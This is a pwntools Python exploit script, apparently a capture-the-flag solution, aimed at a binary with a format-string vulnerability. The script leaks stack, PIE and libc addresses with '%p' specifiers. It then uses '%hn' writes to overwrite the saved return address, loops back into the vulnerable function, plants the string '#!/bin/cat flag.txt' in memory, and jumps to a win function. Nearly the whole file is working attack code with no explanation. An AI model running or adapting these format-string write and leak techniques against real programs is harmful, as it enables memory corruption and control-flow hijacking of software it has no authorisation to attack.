#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'main_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1352
brva 0x139f
brva 0x1415
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================
# leak stack and pie
payload = b'%18$p|%19$p|%21$p'
sla(b'first name: ', payload)
p.recvuntil(b'entered ')
srip = int(p.recv(14), 16)-0x8
p.recvuntil(b'|')
pie = int(p.recv(14), 16)-0x14b5
p.recvuntil(b'|')
libc.address = int(p.recv(14), 16)-0x29f75
log.info(f'srip: {hex(srip)}')
log.info(f'pie base: {hex(pie)}')
log.info(f'libc base: {hex(libc.address)}')

# back to vuln
vuln = pie+0x14b0
padding = int(vuln & 0xffff)
payload = f'%{padding}c%14$hn'.encode().ljust(16, b'\x00') + p64(srip)
sla(b'last name: ', payload)

# gadgets
leave_ret = 0x0000000000001479 + pie
ret = 0x0000000000001273 + pie
pop_rbp = 0x0000000000001273 + pie

# input binsh in buf
buf = pie+0x4040
fd = [0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x0] #pwndbg> p/x "#!/bin/cat flag.txt"

for i in range(0, len(fd)//2):
    ch = int(fd[i*2+1] << 8 | fd[i*2])
    payload = f'%{ch}c%10$hn'.encode().ljust(16, b'\x00') + p64(buf+i*2)
    sla(b'first name: ', payload)

    padding = int(vuln & 0xffff)
    payload = f'%{padding}c%14$hn'.encode().ljust(16, b'\x00') + p64(srip)
    sla(b'last name: ', payload)

win = pie + 0x1289 + 5
padding = int(win & 0xffff)
payload = f'%{padding}c%10$hn'.encode().ljust(16, b'\x00') + p64(srip)
sla(b'first name: ', payload)

sla(b'last name: ', b'DTM')

p.interactive()
